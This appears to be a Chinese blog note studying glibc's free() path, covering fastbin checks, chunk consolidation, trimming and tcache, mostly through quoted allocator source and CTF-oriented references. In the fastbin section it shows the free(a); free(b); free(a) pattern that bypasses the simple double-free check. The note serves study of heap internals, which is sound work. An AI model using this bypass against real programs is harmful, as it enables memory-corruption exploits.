<h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>如果size小于等于fastbin的最大size且不与top chunk相邻，就进入fastbin分支进行判断，符合条件就插入fastbin头部，成为第一个chunk<br>检查：</p>
<ul>
<li>下一个chunk大小小于2*SIZE_SZ</li>
<li><p>下一个chunk大小小于system_mem（系统分配的空间总量）<br>在结构体malloc_state最后：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置chunk的mem部分为perturb_byte</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line">free_perturb (<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br><span class="line">free_perturb (chunk2mem(p), <span class="built_in">size</span> - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>perturb_byte:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line">do_set_perturb_byte (<span class="keyword">int32_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_mallopt_perturb, <span class="number">2</span>, value, perturb_byte);</span><br><span class="line">  perturb_byte = value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ul>
<li>set_fastchunks，对arena的flags标志位的最低bit清零</li>
<li>用chunk的大小判断应该放进哪个fastbin中</li>
<li>对应fastbin的头指针初始化为NULL</li>
<li>automically插入链表:<ol>
<li>chunk的fd赋值为fastbin的值</li>
<li>fastbin赋值为当前chunk的地址</li>
</ol>
</li>
<li>简单的double free检查，如果top of bin和当前free对象相同则报错，bypass方法为<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a)</span><br><span class="line"><span class="built_in">free</span>(b)</span><br><span class="line"><span class="built_in">free</span>(a)</span><br></pre></td></tr></table></figure></li>
<li>fastbin entry 判断<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>另外还有一些多线程的操作没有记上<br>free一个fastbin的过程只进行了一些判断和链接操作，对inuse位没有处理</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>想把代码放上来，但是折叠之后不知道怎么高亮…<br>从：<br><a href="https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4232" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4232</a><br>到4301行</p>
<h3 id="非fastbin"><a href="#非fastbin" class="headerlink" title="非fastbin"></a>非fastbin</h3><p>包括smallbin、largebin、unsortbin</p>
<h4 id="consolidate-amp-amp-free"><a href="#consolidate-amp-amp-free" class="headerlink" title="consolidate&amp;&amp;free"></a>consolidate&amp;&amp;free</h4><p>合并区块的顺序：先考虑物理低地址的空闲块，合并后的chunk指向合并的chunk的低地址</p>
<p>步骤：</p>
<ol>
<li>获得下一个chunk的地址</li>
<li>3个double free check<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">   top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">  malloc_printerr (<span class="string">"double free or corruption (top)"</span>);</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                    &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                    &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"double free or corruption (out)"</span>);</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">"double free or corruption (!prev)"</span>);</span><br></pre></td></tr></table></figure></li>
<li>调用free_perturb函数</li>
<li>向后合并<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  <span class="built_in">size</span> += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>向前合并</li>
</ol>
<ul>
<li><p>如果下一个chunk不是top chunk，则合并高地址的chunk，并将合并后的chunk放入unsorted bin</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">  <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line">  <span class="comment">/* consolidate forward */</span></span><br><span class="line">  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">    unlink_chunk (av, nextchunk);</span><br><span class="line">    <span class="built_in">size</span> += nextsize;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">    not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">    been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  bck = unsorted_chunks(av);</span><br><span class="line">  fwd = bck-&gt;fd;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): corrupted unsorted chunks"</span>);</span><br><span class="line">  p-&gt;fd = fwd;</span><br><span class="line">  p-&gt;bk = bck;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(<span class="built_in">size</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  bck-&gt;fd = p;</span><br><span class="line">  fwd-&gt;bk = p;</span><br><span class="line">  set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">  set_foot(p, <span class="built_in">size</span>);</span><br><span class="line">  check_free_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果下一个chunk是top chunk，则合并到top chunk中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">size</span> += nextsize;</span><br><span class="line">  set_head(p, <span class="built_in">size</span> | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>向系统返还内存<br>如果合并后的chunk大小大于fastbin_consolidation_threshold（默认64k），就向系统返还内存</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don't know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don't want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(<span class="built_in">size</span>) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>释放mmap出的内存<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p>glibc2.26后引入的技术，提升堆管理的性能，也舍弃了很多安全检查</p>
<p>引入了两个结构体”tcache_entry”和”tcache_perthread_struct”</p>
<ul>
<li><p><strong>tcache_entry</strong>用单向链表的方式连接大小相同的空闲chunk结构体；</p>
</li>
<li><p>每个线程会维护一个<strong>tcache_perthread_struct</strong>，作为tcache的管理结构，维护tcache_max_bins个计数器和tcache_max_bins项tcache_entry，规定每条tcache_entry最多有七个chunk</p>
</li>
</ul>
<h3 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h3><ul>
<li>第一次 malloc 时，会先 malloc 一块内存用来存放 tcache_prethread_struct 。</li>
<li>free 内存，且 size 小于 small bin size 时<ul>
<li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li>
<li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li>
<li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li>
</ul>
</li>
<li>malloc 内存，且 size 在 tcache 范围内</li>
<li>先从 tcache 取 chunk，直到 tcache 为空，tcache 为空后，从 bin 中找</li>
<li>tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li>
</ul>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://blog.csdn.net/qq_17713935/article/details/86231502" target="_blank" rel="noopener">https://blog.csdn.net/qq_17713935/article/details/86231502</a>   </p>
<p><a href="https://zhuanlan.zhihu.com/p/24753861" target="_blank" rel="noopener">Linux堆内存管理深入分析（上）</a><br><a href="https://zhuanlan.zhihu.com/p/24790164" target="_blank" rel="noopener">Linux堆内存管理深入分析（下）</a></p>
<p><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/implementation/overview/" target="_blank" rel="noopener">ctf-wiki</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/77316206" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/77316206</a><br>定位子线程chunk的技巧：</p>
<ol>
<li>向子线程的堆块输入特殊值:”0xdeadbeef”</li>
<li>在gdb使用 search -4 0xdeadbeef</li>
<li>搜索出来的地址即堆的地址</li>
</ol>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
</search>
